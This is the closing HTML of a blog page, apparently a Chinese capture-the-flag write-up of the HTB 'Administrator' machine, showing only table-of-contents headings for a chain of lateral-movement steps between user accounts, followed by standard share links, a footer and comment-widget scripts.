toc-level-4"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.2.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Olivia-michael"><span class="toc-number">4.2.1.</span> <span class="toc-text">Olivia-&gt;michael</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#michael-benjamin"><span class="toc-number">4.2.2.</span> <span class="toc-text">michael-&gt;benjamin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#benjamin-emily"><span class="toc-number">4.2.3.</span> <span class="toc-text">benjamin-&gt;emily</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#emily-ethan"><span class="toc-number">4.2.4.</span> <span class="toc-text">emily-&gt;ethan</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Ethan-Administrator"><span class="toc-number">4.2.5.</span> <span class="toc-text">Ethan-&gt;Administrator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E6%97%B6%E9%97%B4"><span class="toc-number">5.</span> <span class="toc-text">恢复时间</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&text=htb-Administrator"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&is_video=false&description=htb-Administrator"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=htb-Administrator&body=Check out this article: https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&title=htb-Administrator"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&name=htb-Administrator&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Administrator/&t=htb-Administrator"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
